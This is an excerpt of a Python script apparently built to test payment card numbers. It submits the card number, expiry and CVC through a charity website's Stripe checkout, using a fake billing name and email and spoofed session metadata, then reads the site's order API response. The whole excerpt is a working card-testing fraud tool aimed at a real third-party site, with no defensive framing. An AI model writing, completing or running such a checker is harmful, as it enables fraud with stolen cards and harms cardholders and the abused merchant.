...
def process_payment(ccn, mm, yy, cvc):
    try:
        # Validate input
        if not all([ccn.isdigit(), mm.isdigit(), yy.isdigit(), cvc.isdigit()]):
            return "Error: Invalid card details format"
        if len(mm) != 2 or len(cvc) < 3 or len(cvc) > 4 or len(ccn) < 15 or len(ccn) > 16:
            return "Error: Invalid card details length"
        ...
        data = (
            ...
            f'&billing_details[address][state]=PA&billing_details[name]=Geroge+Washintonne'
            f'&billing_details[email]=grogeh%40gmail.com&type=card&card[number]={ccn}&card[cvc]={cvc}'
            f'&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified'
            f'&payment_user_agent=stripe.js%2F5445b56991%3B+stripe-js-v3%2F5445b56991%3B+payment-element%3B+deferred-intent'
            f'&referrer=https%3A%2F%2Fwww.onamissionkc.org&time_on_page=145592'
            f'&client_attribution_metadata[client_session_id]=22e7d0ec-db3e-4724-98d2-a1985fc4472a'
            ...
            f'&client_attribution_metadata[elements_session_config_id]=7904f40e-9588-48b2-bc6b-fb88e0ef71d5'
        ...
        response1 = requests.post('https://www.onamissionkc.org/api/2/commerce/orders', cookies=cookies, headers=headers, json=json_data, timeout=10)
        ...
        return f"Error: Invalid response from API - {str(e)}"
